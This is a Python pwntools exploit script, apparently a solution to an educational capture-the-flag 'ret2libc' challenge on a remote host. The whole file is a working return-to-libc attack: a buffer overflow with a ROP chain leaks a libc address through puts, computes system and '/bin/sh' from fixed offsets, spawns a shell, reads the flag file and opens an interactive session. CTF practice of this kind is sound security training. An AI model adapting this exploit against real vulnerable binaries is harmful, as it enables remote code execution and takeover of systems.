'/ Return to libc function /'
from pwn import *
context(arch = 'amd64', os = 'linux')
r = remote('edu-ctf.csie.org', 10175)
#r = process('./ret2libc')

pop_rdi = 0x0000000000400733
puts_plt = 0x0000000000400520
start_main_refer = 0x600ff0
main_func = 0x400698
ret = 0x400506

z = flat(
	'A'*0x38,
	pop_rdi,
	start_main_refer,
	puts_plt,
	main_func
)
r.sendlineafter(':D\n', z)
start_main_func = u64( r.recv(6) + b'\0\0' )
system_func = start_main_func - 0x21ab0 + 0x4f440
bin_sh_ptr = start_main_func - 0x21ab0 + 0x1b3e9a

z = flat(
	'A'*0x38,
	pop_rdi,
	bin_sh_ptr,
	ret,
	system_func
)
r.sendlineafter(':D\n', z)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
